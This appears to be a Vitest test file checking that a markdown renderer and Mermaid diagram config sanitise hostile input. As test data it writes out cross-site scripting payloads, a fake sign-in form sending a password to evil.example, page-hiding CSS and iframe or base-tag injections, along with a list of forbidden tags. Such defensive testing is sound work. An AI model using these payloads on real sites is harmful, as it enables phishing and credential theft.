// @vitest-environment jsdom
import { describe, it, expect } from 'vitest';
import mermaid from 'mermaid';
import { renderMarkdown, MERMAID_CONFIG } from './markdown.ts';

describe('renderMarkdown', () => {
  it('renders headings', () => {
    expect(renderMarkdown('# Title')).toContain('<h1>Title</h1>');
  });

  it('renders emphasis and lists', () => {
    const html = renderMarkdown('- **bold**\n- plain');
    expect(html).toContain('<li>');
    expect(html).toContain('<strong>bold</strong>');
  });

  it('strips <script> tags', () => {
    const html = renderMarkdown('hi <script>alert(1)</script>');
    expect(html).not.toContain('<script');
    expect(html).not.toContain('alert(1)');
  });

  it('strips event-handler attributes', () => {
    const html = renderMarkdown('<img src=x onerror="alert(1)">');
    expect(html).not.toContain('onerror');
  });

  it('refuses what could restyle the page or fake a sign-in form', () => {
    const html = renderMarkdown(
      '<style>body{display:none}</style>' +
        '<form action="https://evil.example/login"><input name="password" type="password"><button formaction="https://evil.example">Sign in</button><select><option>a</option></select><textarea></textarea></form>' +
        '<p style="position:fixed;inset:0">cover</p><iframe src="https://evil.example"></iframe>' +
        '<link rel="stylesheet" href="https://evil.example/x.css"><base href="https://evil.example/">',
    );
    for (const bad of ['<style', 'display:none', '<form', 'evil.example', '<input', '<button', '<select', '<option', '<textarea', 'style=', '<iframe', '<link', '<base']) {
      expect(html).not.toContain(bad);
    }
    expect(html).toContain('cover');
  });

  it('forces safe link target/rel on anchors', () => {
    const html = renderMarkdown('[link](https://example.com)');
    expect(html).toContain('href="https://example.com"');
    expect(html).toContain('rel="noopener noreferrer"');
    expect(html).toContain('target="_blank"');
  });

  it('handles empty/undefined input', () => {
    expect(renderMarkdown('')).toBe('');
    // @ts-expect-error exercising the nullish guard
    expect(renderMarkdown(undefined)).toBe('');
  });

  it('does not let a diagram restyle the page through its init line', async () => {
    mermaid.initialize(MERMAID_CONFIG);
    await mermaid.parse(
      '%%{init: {"themeCSS": "body{display:none}", "fontFamily": "Evil", "securityLevel": "loose", "htmlLabels": true}}%%\ngraph TD; A-->B',
    );
    const cfg = mermaid.mermaidAPI.getConfig();
    expect(cfg.themeCSS ?? '').not.toContain('display:none');
    expect(cfg.fontFamily).toBe('inherit');
    expect(cfg.securityLevel).toBe('strict');
    expect(cfg.htmlLabels).toBe(false);
  });
});
